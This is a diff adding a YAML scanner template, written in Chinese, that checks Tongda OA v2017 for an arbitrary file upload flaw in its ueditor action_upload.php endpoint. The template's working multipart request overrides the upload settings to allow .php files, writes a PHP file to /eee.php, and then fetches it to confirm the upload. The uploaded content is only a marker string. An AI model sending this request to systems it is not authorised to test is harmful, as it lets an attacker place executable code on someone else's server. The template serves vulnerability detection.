@@ -1,0 +1,81 @@
+app: 通达oa
+query: app:"通达oa"
+meta:
+  name: 通达OA v2017 Action_upload任意文件上传漏洞
+  level: 4
+  tags:
+  - file_upload
+  description: 通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达存在任意文件上传漏洞，攻击者可以通过指定接口上传任意文件，获取服务器管理权限。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 安装补丁、升级至最新版
+  create_at: "2024-07-13 15:27:25"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /module/ueditor/php/action_upload.php?action=uploadfile
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+          params: |-
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+
+            ffff
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+
+            1000000000
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+
+            eee
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+
+            .php
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="ffff"; filename="test.php"
+            Content-Type: application/octet-stream
+
+
+            0xold6
+            -----------------------------55719851240137822763221368724
+            Content-Disposition: form-data; name="mufile"
+
+
+            submit
+            -----------------------------55719851240137822763221368724--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+      - request:
+          method: GET
+          path: /eee.php
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: 0xold6
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
